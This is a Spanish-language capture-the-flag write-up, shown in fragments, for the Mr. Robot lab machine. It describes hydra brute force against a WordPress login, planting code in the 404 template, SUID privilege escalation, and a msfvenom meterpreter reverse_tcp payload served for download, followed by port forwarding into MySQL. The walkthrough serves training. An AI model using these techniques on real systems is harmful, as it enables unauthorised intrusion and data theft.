...
image:
    path: /assets/img/headers/portadarobot.webp
    lqip: data:image/UklGRmgAAABXRUJQVlA4IFwAAACwAwCdASoUAAsAPzmGuVOvKSWisAgB4CcJZQAARXpr2Dhv/FyRAAD+v7D81poET+5eSeuwrOajmj1SqT4ieLhsccRcO7gRxp9GL772MjKljs6z090WegteI4AAAA==
...
¿Podremos conseguir ser root en esta máquina al estilo de la serie Mr. Robot?. Hay 3 llaves ocultas ubicadas en la máquina, ¿puedes encontrarlas?.
...
```bash
sort fsocity.dic | uniq > dicc.txt
```
...
Con hydra podremos hacer fuerza bruta aprovechando el mensaje de error que no da el login de Wordpress al fallar nuestro intento y con los parámetros anteriores podemos buscar que usuario es valido dentro de su base de datos de Wordpress, el comando es el siguiente:
...
Estamos en el Dashboard del blog de Wordpress!!
...
Copiamos todo el contenido de nuestro código recien editado y lo pegamos en el template 404 del Wordpress, luego le damos al botón "update".
...
![img-description](/assets/img/mr_robot/dentro.png)
...
Veamos si podemos cambiarnos al usuario "robot" y así poder leer la segunda key contenida en el archivo "key-2-of-3.txt".
...
Veamos si tenemos binarios SUID que nos permitan elevar privilegios a root con el comando
...
A tavés de la página gtfobins.github.io podemos ver que sí hay una forma de escalar privilegios de la siguiente manera.
...
Hemos podido conseguir todas las keys de la máquina Mr. Robot!!
...
```bash
msfvenos -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.186.5 LPORT=4444 -f elf -o shell.elf
```

![img-description](/assets/img/mr_robot/msfvenom.png)

Nos abriremos un servidor web local con python para despues poder descargar desde la máquina Mr. Robot el "shell.elf" que hemos creado.
...
Crearemos un portfwd.

En meterpreter ingresaremos el siguiente comando 

```bash
portfwd add -l 3306 -p 3306 -r 127.0.0.1
```
Con "portfwd list" podemos ver que el comando se haya incluido"

![img-description](/assets/img/mr_robot/pwdactive.png)

Ahora desde nuestra propia terminal podemos ingresar a la base de datos con el siguiente comando 

```bash
mysql -h 127.0.0.1  -u bn_wordpress -p --skip-ssl
```
Donde podemos ver una base de datos llamada "bitnami_wordpress".
...
Donde se encuentra el usuario "Elliot Alderson" y el usuario "Krista Gordon".
